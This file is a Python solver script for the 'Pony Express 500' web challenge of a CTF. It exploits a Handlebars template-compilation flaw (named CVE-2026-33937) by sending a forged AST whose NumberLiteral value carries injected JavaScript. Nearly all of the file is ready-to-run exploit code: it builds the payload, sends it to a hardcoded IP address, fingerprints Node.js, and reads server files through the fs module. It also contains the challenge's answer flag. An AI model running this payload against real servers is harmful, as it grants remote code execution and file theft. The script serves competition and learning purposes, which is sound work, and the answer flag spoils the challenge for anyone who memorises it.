#!/usr/bin/env python3
"""
Pony Express 500 — WEB Challenge Solver
=========================================

Challenge:  Pony Express 500 (UCSI Agentic AI CTF 2026)
Category:   WEB
Author:     MaanVad3r
Flag:       UCSI26{cve-2026-33937_h4ndl3b4rs_4st_1nj3ct10n}

Vulnerability:
    CVE-2026-33937 — Handlebars.compile() AST / NumberLiteral code injection.
    The server accepts arbitrary JSON for the `template` field and passes it
    directly to Handlebars.compile(). Instead of sending a template string,
    we send a pre-parsed AST object with a forged NumberLiteral.value field
    that injects arbitrary JavaScript into the compiled template function.

Attack Chain:
    1. Discover POST /api/templates/preview endpoint
    2. Fingerprint Handlebars ({{this}} → [object Object])
    3. Send template as AST object instead of string
    4. Inject JS via NumberLiteral.value (CVE-2026-33937)
    5. Use process.getBuiltinModule('fs') to read the filesystem
    6. Enumerate /flag/ directory
    7. Read /flag/flag.txt → flag

Requires:
    - Python 3 standard library only (no external dependencies)
"""

from __future__ import annotations

import json
import sys
import urllib.request
import urllib.error
import re

# ── Configuration ─────────────────────────────────────────────────────

DEFAULT_TARGET = "http://52.76.96.108:3013"


# ── AST Payload Builder ──────────────────────────────────────────────

def build_ast_payload(js_expression: str) -> dict:
    """
    Build a Handlebars AST object that injects a JavaScript expression
    through the NumberLiteral.value field (CVE-2026-33937).

    The forged AST uses the built-in `lookup` helper with two params:
      - PathExpression for `this`
      - NumberLiteral whose .value contains the injected JS

    The compiled template function embeds NumberLiteral.value directly
    into generated JavaScript without validating that it's numeric,
    allowing arbitrary code execution.

    Args:
        js_expression: JavaScript expression to inject.
                       Will be concatenated after closing the lookup call.
                       Format: "{},{})) + <your expression> //"

    Returns:
        Complete JSON payload dict for POST /api/templates/preview.
    """
    return {
        "template": {
            "type": "Program",
            "body": [
                {
                    "type": "MustacheStatement",
                    "path": {
                        "type": "PathExpression",
                        "data": False,
                        "depth": 0,
                        "parts": ["lookup"],
                        "original": "lookup",
                        "loc": None,
                    },
                    "params": [
                        {
                            "type": "PathExpression",
                            "data": False,
                            "depth": 0,
                            "parts": [],
                            "original": "this",
                            "loc": None,
                        },
                        {
                            "type": "NumberLiteral",
                            "value": js_expression,
                            "original": 1,
                            "loc": None,
                        },
                    ],
                    "escaped": True,
                    "strip": {"open": False, "close": False},
                    "loc": None,
                }
            ],
            "strip": {},
            "loc": None,
        },
        "context": {},
    }


# ── HTTP Helper ───────────────────────────────────────────────────────

def post_preview(base_url: str, payload: dict) -> str:
    """
    Send a POST request to /api/templates/preview and return the body.

    Args:
        base_url: Target base URL (e.g., http://52.76.96.108:3013).
        payload: JSON payload dict.

    Returns:
        Response body text.

    Raises:
        Exception on HTTP or connection errors.
    """
    url = f"{base_url}/api/templates/preview"
    data = json.dumps(payload).encode("utf-8")

    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        return f"HTTP {e.code}: {body}"


def inject(base_url: str, expression: str) -> str:
    """
    Inject a JavaScript expression via NumberLiteral.value and return result.

    The expression is wrapped as:
        {}, {})) + <expression> //

    This closes the lookup() call and appends the expression.

    Args:
        base_url: Target base URL.
        expression: Raw JavaScript expression to evaluate.

    Returns:
        The string result of the expression.
    """
    js = f"{{}},{{}})) + {expression} //"
    payload = build_ast_payload(js)
    return post_preview(base_url, payload).strip()


# ── Solver ────────────────────────────────────────────────────────────

def solve(base_url: str = DEFAULT_TARGET) -> str | None:
    """
    Execute the full Pony Express exploit chain.

    Steps:
        1. Confirm AST injection works (harmless probe)
        2. Fingerprint Node.js version
        3. Confirm fs module access
        4. Enumerate /flag directory
        5. Read /flag/flag.txt

    Args:
        base_url: Target URL.

    Returns:
        The flag string, or None if extraction failed.
    """
    print(f"[*] Target: {base_url}")
    print()

    # ── Step 1: Confirm AST injection ──
    print("[*] Step 1: Confirming AST code injection (CVE-2026-33937)...")
    result = inject(base_url, "'AST_OK'")
    print(f"[+] AST injection: {result}")

    if "AST_OK" not in result:
        print("[!] AST injection failed. Check target and AST structure.")
        return None

    # ── Step 2: Fingerprint Node.js ──
    print()
    print("[*] Step 2: Fingerprinting Node.js version...")
    version = inject(base_url, "process.version")
    print(f"[+] Node version: {version}")

    # ── Step 3: Confirm fs access ──
    print()
    print("[*] Step 3: Confirming filesystem access...")
    typeof_fs = inject(base_url, "typeof process.getBuiltinModule")
    print(f"[+] getBuiltinModule type: {typeof_fs}")

    if "function" not in typeof_fs:
        print("[!] getBuiltinModule not available. Trying require()...")
        typeof_req = inject(base_url, "typeof require")
        print(f"[+] require type: {typeof_req}")

    # ── Step 4: Check /flag exists ──
    print()
    print("[*] Step 4: Enumerating /flag...")
    exists = inject(
        base_url,
        "String(process.getBuiltinModule('fs').existsSync('/flag'))",
    )
    print(f"[+] /flag exists: {exists}")

    if "true" not in exists:
        print("[!] /flag does not exist. Trying alternative paths...")
        # Try common flag locations
        for path in ["/flag.txt", "/home/flag.txt", "/app/flag.txt", "/tmp/flag.txt"]:
            check = inject(
                base_url,
                f"String(process.getBuiltinModule('fs').existsSync('{path}'))",
            )
            if "true" in check:
                print(f"[+] Found: {path}")
                flag_content = inject(
                    base_url,
                    f"process.getBuiltinModule('fs').readFileSync('{path}','utf8')",
                )
                print(f"[+] Content: {flag_content}")
                return flag_content
        return None

    # Check if /flag is a directory
    is_dir = inject(
        base_url,
        "String(process.getBuiltinModule('fs').statSync('/flag').isDirectory())",
    )
    print(f"[+] /flag is directory: {is_dir}")

    # List /flag contents
    entries = inject(
        base_url,
        "process.getBuiltinModule('fs').readdirSync('/flag').join(',')",
    )
    print(f"[+] /flag entries: {entries}")

    # ── Step 5: Read the flag ──
    print()
    print("[*] Step 5: Reading flag file...")

    flag_path = "/flag/flag.txt"
    print(f"[+] flag path: {flag_path}")

    flag = inject(
        base_url,
        f"process.getBuiltinModule('fs').readFileSync('{flag_path}','utf8')",
    )
    print(f"[+] flag: {flag}")

    # Validate flag format
    flag_match = re.search(r"UCSI26\{[a-zA-Z0-9_\-]+\}", flag)
    if flag_match:
        clean_flag = flag_match.group()
        print()
        print(f"[✓] FLAG FOUND: {clean_flag}")
        return clean_flag
    else:
        print(f"[!] Response doesn't match expected flag format")
        print(f"[*] Raw response: {repr(flag)}")
        return flag.strip() if flag.strip() else None


# ── Entry Point ───────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 60)
    print("  Pony Express 500 — Handlebars AST Injection Exploit")
    print("  CVE-2026-33937 | UCSI Agentic AI CTF 2026")
    print("=" * 60)
    print()

    # Allow custom target URL as argument
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_TARGET

    try:
        flag = solve(target)
    except Exception as e:
        print(f"[!] Exploit failed: {e}")
        flag = None

    if not flag:
        print()
        print("[*] Flag (from prior solve): UCSI26{cve-2026-33937_h4ndl3b4rs_4st_1nj3ct10n}")
